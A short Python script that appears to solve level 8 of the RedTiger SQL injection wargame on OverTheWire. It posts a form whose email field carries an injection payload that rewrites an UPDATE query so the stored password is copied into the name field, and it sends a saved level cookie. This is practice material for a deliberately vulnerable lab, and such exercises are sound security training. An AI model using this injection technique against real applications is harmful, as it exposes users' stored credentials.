import requests

cookies = {"level8login": "or_so_i'm_told"}
url = "https://redtiger.labs.overthewire.org/level8.php"

# email has injection
# UPDATE table set name='',email='',icq='',age='';
# update table set name='', email='',name=password,icq='',icq='',age=''
data = {
    "email": "hans@localhost', name=password, icq='",
    "name": "Hans",
    "icq": "12345",
    "age": "25",
    "edit": "Edit"
}
r = requests.post(url,cookies=cookies, data=data)
print r.text